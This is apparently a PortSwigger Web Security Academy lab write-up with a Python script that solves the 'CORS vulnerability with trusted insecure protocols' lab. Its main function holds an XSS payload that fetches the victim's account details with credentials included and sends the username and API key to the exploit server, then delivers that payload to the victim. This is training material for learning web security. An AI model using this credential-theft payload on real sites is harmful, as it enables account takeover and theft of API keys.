## Web security academy
### Lab Title: CORS vulnerability with trusted insecure protocols
### Lab: 03
Extracting the administrator API-KEY using CORS vulnerability with trusted insecure protocols.

## My Points:

1. **Introduction:** <br>[Portswigger's web security academy](https://portswigger.net/) is a platform that provides practice labs for finding web application vulnerabilities. In this Lab-03 the victim is redirected to the insecure protocols to get the API-KEY.

2. **Technique Fetch Method :**
     - **Fetch Method:** is used to get the resources like XMLHttpRequest, and for details check the references.
     <br>
     
     > Windows: 
     ```
     python lab-03.py
     ```
     
     > Linux:
     ```
     python3 lab-03.py
     ```


3. **Code:**
     - **Define main variables:**
     
        ```    
        # Burp Suite proxy
        proxy_urls = {
          'http': 'http://127.0.0.1:8080',
          'https': 'http://127.0.0.1:8080',
        }
       
        ```
        <br>
        
     - **User inputs:** When the program executes, it takes Lab URL and Exploit Server URL from the user.
      - **Note:** The default exploit server's URL that ends with /exploit used in this code that's why don't change /exploit unless you know how to edit the code.   

        ```        
        if __name__ == "__main__":
         # User input: Lab URL(s)
         k_lab = input("Enter Lab URL: ").strip().rstrip("/").lstrip("https://")
         k_exploit_server = input("Enter Exploit Server URL: ").strip().rstrip("exploit").rstrip("/")

         if (not (k_lab and k_exploit_server)):
             print()
             print("[-] Error! Input URL(s) missing.")
             print("[-] Lab URL: https://a...........c2.web-security-academy.net")
             print("[-] Exploit Server URL: https://exploit-a...........c2.web-security-academy.net/exploit")
             sys.exit()
         else:
             main()
        ```     
     
        - Enter URL: Get lab URL from your browser address bar and paste it.

        - Enter URL: Get Exploit Server URL from your browser address bar and paste it.
    <br>

    - **Main Function:** After giving the required input the main function is called.

        ```        
        def main():
          # Xss injection + account APIKEY request + send APIKEY to exploit server
         cors_access = f"<script>location=\"http://stock.{k_lab}/?productId=1<script>fetch('https://{k_lab}/accountDetails',{{credentials:'include'}}).then(res=>res.json()).then(data=>fetch('{k_exploit_server}/exploit/log?key='%2BencodeURIComponent(data.username%2B':'%2Bdata.apikey)))%3C/script>&storeId=1\"</script>"

         payload = {
             'urlIsHttps':'on',
             'responseFile': '/exploit',
             'responseHead': "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
             'responseBody': cors_access,
             'formAction':'DELIVER_TO_VICTIM'
         }

         # Send payload to exploit server
         res = requests.post(
             k_exploit_server, 
             data = payload, 
             headers = {'Content-type':'application/x-www-form-urlencoded'},
             proxies = proxy_urls,
             verify = False
             )

         if res:
             api_key = get_apikey()

             if api_key:
                 print('APIKEY: ' + api_key)
             else:
                 print('[-] Error in getting APIKEY.')
         else:
             print('[-] Error in sending payload to exploit server.')          
        ```

       The main points of this function:
     
     1. Location is used to redirect to the insecure path.
     2. Xss attack injected to the product ID.
     3. In Xss a **<script>** is injected using fetch method, and fetch method credentials are also included in the request. 
     4. After getting a response, again a fetch method is used to send username and apikey to the exploit server. I am only sending ( username : apikey ) in this format.
     5. Then get_apikey() function is called. In this function, API-KEY is extracted using regular expression.
     <br>
     
     
     ```        
     def get_apikey():
          res = requests.get(k_exploit_server + '/log', proxies=proxy_urls, verify=False)

         if res:
             data = requests.utils.unquote(res.text)
             pattren = re.compile('administrator:(\S*)')
             result = pattren.search(data)

             if result and result.group(1) is not None:
                 return result.group(1)
             else:
                 return False
          
      ```


## References:
   - [https://portswigger.net/web-security/dashboard](https://portswigger.net/web-security/dashboard)
   - [https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API)

